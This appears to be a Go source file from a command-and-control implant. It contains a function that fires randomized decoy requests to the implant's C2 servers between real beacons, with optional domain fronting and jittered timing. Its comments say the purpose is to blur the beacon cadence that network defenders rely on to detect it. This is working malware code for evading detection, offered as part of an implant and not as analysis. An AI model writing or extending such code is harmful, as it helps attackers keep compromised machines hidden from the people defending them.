//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"net/http"
	"time"
)

// sendCoverTrafficBurst fires a small number of decoy GET requests to the
// configured C2 endpoints between real beacons. The decoys hit the same
// listeners the implant already talks to (never third-party domains, so no
// unexpected external egress) and are indistinguishable from an operator
// browsing the team server. Sprinkling these into the sleep window pollutes the
// otherwise regular beacon cadence that network defenders key on.
//
// Opt-in only (getActiveCoverTraffic gates it); disabled by default. Every
// request is best-effort: errors are swallowed and never affect the real beacon.
func sendCoverTrafficBurst() {
	enabled, maxBurst := getActiveCoverTraffic()
	if !enabled || maxBurst <= 0 {
		return
	}
	urls := C2URLs
	if len(urls) == 0 {
		return
	}
	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(maxBurst)+1))
	if err != nil {
		return
	}
	n := int(nBig.Int64())
	for i := 0; i < n; i++ {
		base := urls[i%len(urls)]
		u := fmt.Sprintf("%s/?_=%d", base, time.Now().UnixNano())
		req, err := http.NewRequest(http.MethodGet, u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", getActiveUserAgentFromConfig())
		if DomainFront != "" {
			req.Host = DomainFront
		}
		if resp, err := client.Do(req); err == nil {
			resp.Body.Close()
		}
		// Small, randomized inter-decoy gap so bursts don't look machine-tight.
		gap, _ := rand.Int(rand.Reader, big.NewInt(450))
		time.Sleep(time.Duration(50+gap.Int64()) * time.Millisecond)
	}
}
